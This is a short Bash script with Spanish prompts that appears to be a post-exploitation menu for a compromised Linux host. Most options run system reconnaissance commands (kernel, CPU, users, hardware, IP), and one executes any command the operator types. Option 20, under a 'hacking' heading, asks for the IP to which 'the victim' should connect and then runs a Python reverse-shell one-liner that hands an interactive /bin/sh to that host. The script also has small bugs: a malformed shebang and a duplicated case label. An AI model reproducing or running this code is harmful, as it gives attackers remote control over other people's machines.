#!bin/bash

clearscr(){

clear

}

clearscr
while true 
do
	
	echo -e "
	
	$(tput setaf 2)View Info       	command			hacking 		
	
	$(tput setaf 7)
	1 = kernel	        8 = ls			20 = portforwarding
	2 = info_cpu		9 = comando manual
	3 = whoami		10 = pwd
	4 = info hardware	11 = clear
	5 = view users
	6 = view version OS
	7 = view IP		99 = exit
"
read -p "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar > $(tput setaf 7) " option 

	      
	case $option in  

     		99) exit ;;
		10) pwd ;;  	
		6) ls ;;
		7) ifconfig ;;
		1) uname -a ;;
		2) lscpu ;;
		9) read -p "Introzca comando manualmente > " comando && $comando ;;
		3) whoami ;;
		4) dmidecode ;;
		5) who -a ;;
		6) cat /proc/version ;;
		11) clear ;;
		20) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && read -p "INtroduzca un puerto > " puerto && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);p=subprocess.call(["/bin/sh","-i"]);'

		


	esac
done 

